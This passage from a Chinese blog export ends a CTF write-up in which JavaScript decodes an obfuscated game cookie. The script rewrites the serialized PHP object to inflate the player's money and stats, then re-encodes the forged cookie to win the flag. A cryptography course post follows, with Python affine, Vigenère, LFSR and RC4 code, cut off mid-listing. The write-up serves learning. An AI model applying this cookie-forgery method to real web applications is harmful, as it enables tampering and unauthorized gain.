			c = utftext.charCodeAt(i);
			if (c &lt; 128) &#123;
<span class="javascript">				string += <span class="hljs-built_in">String</span>.fromCharCode(c);</span>
				i++;
<span class="javascript">			&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((c &gt; <span class="hljs-number">191</span>) &amp;&amp; (c &lt; <span class="hljs-number">224</span>)) &#123;</span>
				c2 = utftext.charCodeAt(i+1);
<span class="javascript">				string += <span class="hljs-built_in">String</span>.fromCharCode(((c &amp; <span class="hljs-number">31</span>) &lt;&lt; <span class="hljs-number">6</span>) | (c2 &amp; <span class="hljs-number">63</span>));</span>
				i += 2;
<span class="javascript">			&#125; <span class="hljs-keyword">else</span> &#123;</span>
				c2 = utftext.charCodeAt(i+1);
				c3 = utftext.charCodeAt(i+2);
<span class="javascript">				string += <span class="hljs-built_in">String</span>.fromCharCode(((c &amp; <span class="hljs-number">15</span>) &lt;&lt; <span class="hljs-number">12</span>) | ((c2 &amp; <span class="hljs-number">63</span>) &lt;&lt; <span class="hljs-number">6</span>) | (c3 &amp; <span class="hljs-number">63</span>));</span>
				i += 3;
			&#125;
		&#125;
<span class="javascript">		<span class="hljs-keyword">return</span> string;</span>
	&#125;
&#125;


<span class="javascript"><span class="hljs-comment">//原来cookie</span></span>
<span class="javascript"><span class="hljs-keyword">var</span> temp = <span class="hljs-string">&quot;UTw7PCxqe3FjcC42OThOjWtSUFYwbm99amlzbG0wI3MeHBsUZ1liZxQMWEFDXl8EdUUOCgACd016B34WUlFWWTVoATEAAXF5P3Z2CmYgPTY5Pj90FSUUaGUfL2ZnYnYhCRMTGRQPQCcHKFIvEShXUlYCGQMbDQ4FXEcXREo/BTzBxKbu6fbrB+H+ps3nsLrP6dCs0LgR8fj1/+6y3+/apJ3XnJnkjNPf0NnRjpPD7pjzzfaMiJDcxt/XkP/B+I2C5vTqgUE=&quot;</span>;</span>
<span class="javascript"><span class="hljs-comment">//进行加密，获取明文</span></span>

<span class="javascript"><span class="hljs-keyword">var</span> base = <span class="hljs-keyword">new</span> Base64();</span>
<span class="javascript"><span class="hljs-keyword">var</span> result = base.decode(temp);</span>
<span class="javascript"><span class="hljs-keyword">var</span> result3 = <span class="hljs-string">&quot;&quot;</span>;</span>
for (i = 0; i &lt; result.length; i++) &#123;
<span class="javascript">	<span class="hljs-keyword">var</span> num = result[i].charCodeAt();</span>
	num = num ^ i;
	num = num - ((i % 10) + 2);
<span class="javascript">	result3 += <span class="hljs-built_in">String</span>.fromCharCode(num);</span>
&#125;
    
<span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;原明文：&quot;</span>+result3+<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>);</span>
<span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>);</span>

<span class="javascript"><span class="hljs-keyword">var</span> result3 = <span class="hljs-string">&#x27;O:5:&quot;human&quot;:10:&#123;s:8:&quot;xueliang&quot;;i:830;s:5:&quot;neili&quot;;i:602;s:5:&quot;lidao&quot;;i:95;s:6:&quot;dingli&quot;;i:63;s:7:&quot;waigong&quot;;i:0;s:7:&quot;neigong&quot;;i:0;s:7:&quot;jingyan&quot;;i:0;s:6:&quot;yelian&quot;;i:0;s:5:&quot;money&quot;;i:200000;s:4:&quot;flag&quot;;s:1:&quot;0&quot;;&#125;&#x27;</span>;</span>
<span class="javascript"><span class="hljs-comment">//反编码获取cookie</span></span>
<span class="javascript"><span class="hljs-keyword">var</span> result = <span class="hljs-string">&quot;&quot;</span>;</span>
for (i = 0;i&lt;result3.length;i++)&#123;
	num = result3[i].charCodeAt();
	num = num + ((i % 10) + 2);
	num = num ^ i;
<span class="javascript">	result += <span class="hljs-built_in">String</span>.fromCharCode(num);</span>
&#125;
<span class="javascript"><span class="hljs-keyword">var</span> temp= base.encode(result);</span>

<span class="javascript"><span class="hljs-comment">//将cookie进行url编码</span></span>
<span class="javascript">temp = <span class="hljs-built_in">encodeURIComponent</span>(temp);</span>
<span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;cookie:&quot;</span>+temp+<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>);</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>



<p>编码结果</p>
<pre><code class="hljs apache"><span class="hljs-attribute">UTw7PCxqe3FjcC42OThOjWtSUFYwbm99amlzbG0wI3MeHBsUZ1liZxQMWEFDXl8EdUUOCgACd016B34WUlFWWTVoATEAAXF5P3Z2CmYgPTY5Pj90FSUUaGUfL2ZnYnYhCRMTGRQPQCcHKFIvEShXUlYCGQMbDQ4FXEcXREo</span>%<span class="hljs-number">2</span>FBTzBxKbu<span class="hljs-number">6</span>fbrB%<span class="hljs-number">2</span>BH%<span class="hljs-number">2</span>Bps<span class="hljs-number">3</span>nsLrP<span class="hljs-number">6</span>dCs<span class="hljs-number">0</span>LgR<span class="hljs-number">8</span>fj<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>B<span class="hljs-number">6</span>y<span class="hljs-number">3</span>%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>FapJ<span class="hljs-number">3</span>XnJnkjNPf<span class="hljs-number">0</span>NnRjpPD<span class="hljs-number">7</span>paIiIiIhovBiIL<span class="hljs-number">4</span>kNTK<span class="hljs-number">0</span>dea%<span class="hljs-number">2</span>F<span class="hljs-number">7</span>mC%<span class="hljs-number">2</span>B<span class="hljs-number">4</span>bu%<span class="hljs-number">2</span>FOr<span class="hljs-number">1</span>SQ%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>D</code></pre>

<p>这就是我们期待的cookie,然后用工具修改cookie</p>
<p><img src="https://i.loli.net/2020/11/25/WMk48YRo5veBxXr.png" alt="nt-9.png"></p>
<p>修满属性值打怪拿到flag</p>
<p><img src="https://i.loli.net/2020/11/25/5Geyh8r7vBDOqKE.png" alt="mt-10.png"></p>
<p><a href="https://blog.csdn.net/weixin_41924764/article/details/109488408?utm_medium=distribute.pc_relevant.none-task-blog-title-2&spm=1001.2101.3001.4242">参考</a></p>
<p>这道题虽然很难，但是在一步一步尝试的过程中学到很多有用的东西，收获还是很大的，感谢师傅的wp，看了好久才做出了。</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>脚本</tag>
        <tag>php</tag>
        <tag>cookie</tag>
        <tag>编码</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学</title>
    <url>/2020/12/23/%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
    <content><![CDATA[<p>密码学实验课程设计</p>
<span id="more"></span>

<h1 id="一、古典密码"><a href="#一、古典密码" class="headerlink" title="一、古典密码"></a>一、古典密码</h1><h2 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>仿射加密在本质上还是一个置换密码：如果说移位密码是一个常数级别的置换，那么，仿射加密是一个一次级别的置换</p>
<h3 id="加密原理"><a href="#加密原理" class="headerlink" title="加密原理"></a>加密原理</h3><p>假设X，Y，A，B是Z26整数环中的元素，A和B为密钥，X是原文，Y是密文</p>
<p>加密函数：Y=（AX+B）%26</p>
<p>解密函数：Y=（AX+B）%26，得到：X=（A的逆元）*（Y-B）%26</p>
<p>原理很简单，代码实现也比较简单</p>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>各个函数作用</p>
<pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">gcd</span><span class="hljs-params">(a,b)</span></span>  求<span class="hljs-selector-tag">a</span>,b的最大公因子
<span class="hljs-function"><span class="hljs-title">findModReverse</span><span class="hljs-params">(a,m)</span></span>  计算a模m的逆元
<span class="hljs-function"><span class="hljs-title">encode</span><span class="hljs-params">(a,b,s)</span></span>       仿射加密
<span class="hljs-function"><span class="hljs-title">decode</span><span class="hljs-params">(a,b,s)</span></span>		仿射解密</code></pre>

<p>利用扩展的欧几里得算法求逆元</p>
<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gcd</span>(<span class="hljs-params">a,b</span>):</span>  <span class="hljs-comment"># 求出最大公因数</span>
    <span class="hljs-keyword">while</span> a!=<span class="hljs-number">0</span>:
        a,b = b%a,a
    <span class="hljs-keyword">return</span> b

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">findModReverse</span>(<span class="hljs-params">a,m</span>):</span> <span class="hljs-comment">#扩展欧几里得算法求模逆</span>
    <span class="hljs-keyword">if</span> gcd(a,m)!=<span class="hljs-number">1</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    u1,u2,u3 = <span class="hljs-number">1</span>,<span class="hljs-number">0</span>,a
    v1,v2,v3 = <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,m
    <span class="hljs-keyword">while</span> v3!=<span class="hljs-number">0</span>:
        q = u3//v3
        v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3
    <span class="hljs-keyword">return</span> u1%m</code></pre>

<p>完整代码如下</p>
<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gcd</span>(<span class="hljs-params">a,b</span>):</span>  <span class="hljs-comment"># 求出最大公因数</span>
    <span class="hljs-keyword">while</span> a!=<span class="hljs-number">0</span>:
        a,b = b%a,a
    <span class="hljs-keyword">return</span> b

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">findModReverse</span>(<span class="hljs-params">a,m</span>):</span> <span class="hljs-comment">#扩展欧几里得算法求模逆</span>
    <span class="hljs-keyword">if</span> gcd(a,m)!=<span class="hljs-number">1</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    u1,u2,u3 = <span class="hljs-number">1</span>,<span class="hljs-number">0</span>,a
    v1,v2,v3 = <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,m
    <span class="hljs-keyword">while</span> v3!=<span class="hljs-number">0</span>:
        q = u3//v3
        v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3
    <span class="hljs-keyword">return</span> u1%m

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span>(<span class="hljs-params">a,b,s</span>):</span>
    result = <span class="hljs-string">&quot;&quot;</span>          <span class="hljs-comment"># 保存加密结果</span>
    s = s.upper()		 <span class="hljs-comment"># 全部转换为大写，方便计算</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s)):
        s2 = <span class="hljs-built_in">chr</span>((a*(<span class="hljs-built_in">ord</span>(s[i])-<span class="hljs-number">65</span>)+b)%<span class="hljs-number">26</span> + <span class="hljs-number">65</span>)  <span class="hljs-comment">#使用加密公式 Y=（AX+B）%26</span>
        result = result +s2
    print(result.lower())

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span>(<span class="hljs-params">a,b,s</span>):</span>
    a1 = findModReverse(a,<span class="hljs-number">26</span>)
    result = <span class="hljs-string">&quot;&quot;</span>
    s = s.upper()
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(s)):
        s2 = <span class="hljs-built_in">chr</span>((a1 * (<span class="hljs-built_in">ord</span>(s[i]) - <span class="hljs-number">65</span> - b)) % <span class="hljs-number">26</span> + <span class="hljs-number">65</span>) <span class="hljs-comment"># 使用解密公式X=（A的逆元）*（Y-B）%26</span>
        result = result + s2
    print(result.lower())

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">s_decode</span>(<span class="hljs-params">a,b,s</span>):</span>
    letter =<span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>
    letter = letter.upper()
    s = s.upper()
    result = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(letter)):
            <span class="hljs-keyword">if</span> i == letter[(a*j+b)%<span class="hljs-number">26</span>]:
                result = result+letter[j]
    print(result.lower())

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>										<span class="hljs-comment"># 主函数入口</span>
    answer = <span class="hljs-built_in">input</span>(<span class="hljs-string">f&#x27;请输入所需的操作：编码/E or 解码/D: &#x27;</span>)
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">if</span> answer.upper() == <span class="hljs-string">&#x27;E&#x27;</span>:
            a = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入a:&#x27;</span>))
            b = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入b:&#x27;</span>))
            s = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入需要加密的字符:&#x27;</span>)
            encode(a, b, s)
        <span class="hljs-keyword">elif</span> answer.upper() == <span class="hljs-string">&#x27;D&#x27;</span>:
            a = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入a:&#x27;</span>))
            b = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入b:&#x27;</span>))
            s = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入需要解密的字符：&#x27;</span>)
            decode(a, b, s)  <span class="hljs-comment"># 利用逆元解密</span>
            <span class="hljs-comment"># s_decode(a,b,s)   # 暴力枚举每一个字符</span>
        <span class="hljs-keyword">else</span>:
            print(<span class="hljs-string">&#x27;输入错误！&#x27;</span>)
    <span class="hljs-keyword">except</span> KeyError:
        print(<span class="hljs-string">&#x27;请勿输入空格！&#x27;</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    main()
<span class="hljs-comment"># a = 7, b = 22</span>
<span class="hljs-comment"># plain = firstthesentenceandthentheevidencesaidthequeen</span>
<span class="hljs-comment"># crypto = falszztysyjzyjkywjrztyjztyynaryjkyswarztyegyyj</span></code></pre>

<p>加解密结果如图所示</p>
<p><img src="https://i.loli.net/2020/12/23/CqbfOdNB3mxHDt4.png" alt="image-20201223225306141"></p>
<p><img src="https://i.loli.net/2020/12/23/CZHiL8cDjlUdvSw.png" alt="image-20201223225317161"></p>
<h3 id="破解仿射密码"><a href="#破解仿射密码" class="headerlink" title="破解仿射密码"></a>破解仿射密码</h3><p>这里使用了加解密中的 <code>gcd</code> <code>findModReverse</code>，找出26以内且与26互素的所有数的逆元，并存放在一个列表中</p>
<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">findAllre</span>():</span>    <span class="hljs-comment"># 找出所有小于26且与26互素的数</span>
    re_all = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">26</span>):
        <span class="hljs-keyword">if</span> gcd(i,<span class="hljs-number">26</span>) == <span class="hljs-number">1</span>:
            res = findModReverse(i,<span class="hljs-number">26</span>)
            re_all.append(res)
    <span class="hljs-comment">#re_all.sort()</span>
    <span class="hljs-keyword">return</span> re_all</code></pre>

<p>完整代码如下</p>
<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gcd</span>(<span class="hljs-params">a,b</span>):</span>  <span class="hljs-comment"># 求出最大公因数</span>
    <span class="hljs-keyword">while</span> a!=<span class="hljs-number">0</span>:
        a,b = b%a,a
    <span class="hljs-keyword">return</span> b

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">findModReverse</span>(<span class="hljs-params">a,m</span>):</span> <span class="hljs-comment">#扩展欧几里得算法求模逆</span>
    <span class="hljs-keyword">if</span> gcd(a,m)!=<span class="hljs-number">1</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    u1,u2,u3 = <span class="hljs-number">1</span>,<span class="hljs-number">0</span>,a
    v1,v2,v3 = <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,m
    <span class="hljs-keyword">while</span> v3!=<span class="hljs-number">0</span>:
        q = u3//v3
        v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3
    <span class="hljs-keyword">return</span> u1%m

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">findAllre</span>():</span>    <span class="hljs-comment"># 找出所有小于26且与26互素的数</span>
    re_all = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">26</span>):
        <span class="hljs-keyword">if</span> gcd(i,<span class="hljs-number">26</span>) == <span class="hljs-number">1</span>:
            res = findModReverse(i,<span class="hljs-number">26</span>)
            re_all.append(res)
    <span class="hljs-comment">#re_all.sort()</span>
    <span class="hljs-keyword">return</span> re_all

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span>(<span class="hljs-params">s</span>):</span>
    re_all = findAllre()
    <span class="hljs-keyword">for</span> k1 <span class="hljs-keyword">in</span> re_all:
        <span class="hljs-keyword">for</span> k2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">26</span>):
            result = <span class="hljs-string">&quot;&quot;</span>
            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):
                s2 = <span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">int</span>(k1) * (<span class="hljs-built_in">ord</span>(s[i]) - <span class="hljs-number">97</span> - k2)) % <span class="hljs-number">26</span> + <span class="hljs-number">97</span>))
                result = result + s2
            print(<span class="hljs-string">&quot;k1=&quot;</span> + <span class="hljs-built_in">str</span>(findModReverse(k1,<span class="hljs-number">26</span>)) + <span class="hljs-string">&quot;, k2=&quot;</span> + <span class="hljs-built_in">str</span>(k2) + <span class="hljs-string">&quot; plaintext = &quot;</span> + result)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>
   <span class="hljs-comment"># criphertext = &#x27;falszztysyjzyjkywjrztyjztyynaryjkyswarztyegyyj&#x27;</span>
    criphertext = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要破解的密文: &quot;</span>)
    criphertext = criphertext.lower()
    print(<span class="hljs-string">&quot;---------&quot;</span>*<span class="hljs-number">3</span>+<span class="hljs-string">&quot;strat attck&quot;</span>+<span class="hljs-string">&quot;---------&quot;</span>*<span class="hljs-number">3</span>)
    decode(criphertext)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
     main()</code></pre>

<p>效果如下</p>
<img src="https://i.loli.net/2020/12/23/lrQLWVebkuphvTK.png" alt="image-20201223170037595" style="zoom:67%;">

<h2 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h3><p><strong>维吉尼亚密码</strong>（又译<strong>维热纳尔密码</strong>）是使用一系列<a href="https://baike.baidu.com/item/凯撒密码">凯撒密码</a>组成密码字母表的加密算法，属于多表密码的一种简单形式。</p>
<p>维吉尼亚密码曾多次被发明。该方法最早记录在<a href="https://baike.baidu.com/item/吉奥万·巴蒂斯塔·贝拉索">吉奥万·巴蒂斯塔·贝拉索</a>（ Giovan Battista Bellaso）于1553年所著的书《吉奥万·巴蒂斯塔·贝拉索先生的密码》（<a href="https://baike.baidu.com/item/意大利语">意大利语</a>：La cifra del. Sig. Giovan Battista Bellaso）中。然而，后来在19世纪时被误传为是<a href="https://baike.baidu.com/item/法国">法国</a>外交官<a href="https://baike.baidu.com/item/布莱斯·德·维吉尼亚">布莱斯·德·维吉尼亚</a>（Blaise De Vigenère）所创造，因此现在被称为“维吉尼亚密码”。</p>
<p>维吉尼亚密码以其简单易用而著称，同时初学者通常难以破解，因而又被称为“不可破译的密码”。这也让很多人使用维吉尼亚密码来加密的目的就是为了将其破解。</p>
<h3 id="2-加解密原理"><a href="#2-加解密原理" class="headerlink" title="2.加解密原理"></a>2.加解密原理</h3><img src="https://i.loli.net/2020/12/23/DFHntXC9Ysp6dyV.png" alt="image-20201223225441528" style="zoom:67%;">



<p>加解密代码</p>
<pre><code class="hljs python"><span class="hljs-comment"># 将密钥处理成和密文/明文一样长</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve_key</span>(<span class="hljs-params">s,key</span>):</span>
    nkey = key
    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(nkey) &lt; <span class="hljs-built_in">len</span>(s):
        nkey = nkey+key
    nkey = nkey[:<span class="hljs-built_in">len</span>(s)]
    <span class="hljs-keyword">return</span> nkey

<span class="hljs-comment"># 加密函数</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span>(<span class="hljs-params">s,key</span>):</span>
    print(<span class="hljs-string">&#x27;加密后的结果： &#x27;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)
    s1 = s.upper()
    key1 = solve_key(s, key)
    key1 = key1.upper()

    result = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s)):
        s2 = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">abs</span>(((<span class="hljs-built_in">ord</span>(s1[i])-<span class="hljs-number">65</span>)+(<span class="hljs-built_in">ord</span>(key1[i])-<span class="hljs-number">65</span>)) % <span class="hljs-number">26</span>) + <span class="hljs-number">65</span>)
        result = result + s2
    print(result.lower())

<span class="hljs-comment"># 解密函数</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span>(<span class="hljs-params">s,key</span>):</span>
    print(<span class="hljs-string">&#x27;解密后的结果： &#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)
    s1 = s.upper()
    key1 = solve_key(s, key)
    key1 = key1.upper()

    result = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(s)):
        s2 = <span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">ord</span>(s1[i]) - <span class="hljs-number">65</span>) - (<span class="hljs-built_in">ord</span>(key1[i]) - <span class="hljs-number">65</span>)) % <span class="hljs-number">26</span> + <span class="hljs-number">65</span>)
        result = result + s2
    print(result.lower())

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>
    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
        <span class="hljs-comment"># 函数入口</span>
        answer = <span class="hljs-built_in">input</span>(<span class="hljs-string">f&#x27;请输入所需的操作：编码/E or 解码/D:  &#x27;</span>)
        <span class="hljs-keyword">try</span>:
            <span class="hljs-keyword">if</span> answer.upper() == <span class="hljs-string">&#x27;E&#x27;</span>:
                key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入密钥: &#x27;</span>)
                key = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">filter</span>(<span class="hljs-built_in">str</span>.isalpha, key))
                s = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入明文: &#x27;</span>)
                s = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">filter</span>(<span class="hljs-built_in">str</span>.isalpha, s))  <span class="hljs-comment"># 将字符串中的非字母字符去掉</span>
                <span class="hljs-comment"># print(s)</span>
                encode(s, key)
            <span class="hljs-keyword">elif</span> answer.upper() == <span class="hljs-string">&#x27;D&#x27;</span>:
                key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入密钥: &#x27;</span>)
                key = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">filter</span>(<span class="hljs-built_in">str</span>.isalpha, key))
                s = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入密文: &#x27;</span>)
                s = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">filter</span>(<span class="hljs-built_in">str</span>.isalpha, s))
                decode(s, key)
            <span class="hljs-keyword">else</span>:
                print(<span class="hljs-string">&#x27;输入错误！&#x27;</span>)
        <span class="hljs-keyword">except</span> KeyError:
            print(<span class="hljs-string">&#x27;请检查输入是否正确！&#x27;</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    main()</code></pre>





<h1 id="二、序列密码"><a href="#二、序列密码" class="headerlink" title="二、序列密码"></a>二、序列密码</h1><h2 id="LFSR"><a href="#LFSR" class="headerlink" title="LFSR"></a>LFSR</h2><p>代码实现</p>
<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lsrf</span>(<span class="hljs-params">inti, top</span>):</span>
    <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span>
    inti2 = <span class="hljs-string">&quot;0&quot;</span>*<span class="hljs-built_in">len</span>(inti)
    inti2 = <span class="hljs-built_in">list</span>(inti2)
    inti1 = <span class="hljs-string">&#x27;&#x27;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(inti)):
        <span class="hljs-keyword">if</span> top[i] == <span class="hljs-string">&quot;1&quot;</span>:
            <span class="hljs-built_in">sum</span> += <span class="hljs-built_in">int</span>(inti[i])
    <span class="hljs-built_in">sum</span> = <span class="hljs-built_in">sum</span> % <span class="hljs-number">2</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(inti)):
        <span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span>:
            inti2[i] = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">sum</span>)
        <span class="hljs-keyword">else</span>:
            inti2[i] = inti[i - <span class="hljs-number">1</span>]
    inti1 = inti1.join(inti2)
    <span class="hljs-keyword">return</span> inti1

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>
    inti_str = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入初始化序列：&quot;</span>))
    inti_str = inti_str[::-<span class="hljs-number">1</span>]
    inti_str_backup = inti_str
    top = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入本原多项式：&quot;</span>))
    top = top[::-<span class="hljs-number">1</span>]
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span> ** <span class="hljs-built_in">len</span>(inti_str) + <span class="hljs-number">1</span>):
        <span class="hljs-keyword">if</span> inti_str_backup == inti_str <span class="hljs-keyword">and</span> i != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> i == <span class="hljs-number">2</span> ** <span class="hljs-built_in">len</span>(inti_str) - <span class="hljs-number">1</span>:
            print(<span class="hljs-string">&quot;第&#123;0&#125;次&quot;</span>.<span class="hljs-built_in">format</span>(i), inti_str_backup)
            print(<span class="hljs-string">&quot;是本原多项式且周期是&quot;</span> + <span class="hljs-built_in">str</span>(i))
            <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">elif</span> inti_str_backup == inti_str <span class="hljs-keyword">and</span> i != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> i != <span class="hljs-number">2</span> ** <span class="hljs-built_in">len</span>(inti_str) - <span class="hljs-number">1</span>:
            print(<span class="hljs-string">&quot;第&#123;0&#125;次&quot;</span>.<span class="hljs-built_in">format</span>(i), inti_str_backup)
            print(<span class="hljs-string">&quot;不是本原多项式且周期是&quot;</span> + <span class="hljs-built_in">str</span>(i))
            <span class="hljs-keyword">break</span>
        print(<span class="hljs-string">&quot;第&#123;0&#125;次&quot;</span>.<span class="hljs-built_in">format</span>(i), inti_str_backup)
        inti_str_backup = lsrf(inti_str_backup, top)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    main()</code></pre>

<p>选择本原多项式和初始序列如下</p>
<pre><code class="hljs plain">100000000001000000
011100010100100101</code></pre>

<p>程序运行结果</p>
<p><img src="https://i.loli.net/2020/12/23/gfbRGZ57piKChWS.png" alt="image-20201223222649800"></p>
<h2 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h2><p>完整代码</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib
<span class="hljs-keyword">import</span> base64

<span class="hljs-comment"># S盒初始化置换,Key为密钥</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Rc4_init</span>(<span class="hljs-params">S, Key</span>):</span>
    j = <span class="hljs-number">0</span>
    Key = Key.encode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>)
    Key = hashlib.md5(Key).hexdigest()  <span class="hljs-comment"># 长度为32的字符串</span>
    tmp = []
